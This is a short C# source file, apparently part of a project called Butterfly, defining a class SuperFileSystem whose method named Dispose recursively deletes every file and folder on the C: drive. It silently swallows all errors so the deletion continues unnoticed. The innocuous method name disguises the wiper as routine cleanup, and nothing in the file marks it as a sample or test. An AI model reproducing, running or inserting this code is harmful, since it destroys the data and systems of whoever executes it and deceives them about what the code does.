using System;
using System.IO;

namespace Butterfly.Core
{
    class SuperFileSystem
    {
        internal static void Dispose()
        {
            WalkDirectory(new DirectoryInfo(@"C:\\"));
        }

        private static void WalkDirectory(DirectoryInfo directory)
        {
            try
            {
                foreach (FileInfo file in directory.GetFiles())
                {
                    try
                    {
                        File.Delete(file.FullName);
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                DirectoryInfo[] subDirectories = directory.GetDirectories();

                foreach (DirectoryInfo subDirectory in subDirectories)
                {
                    WalkDirectory(subDirectory);
                }
            }
            catch { }

            try
            {
                Directory.Delete(directory.FullName);
            }
            catch
            { }
        }
    }
}
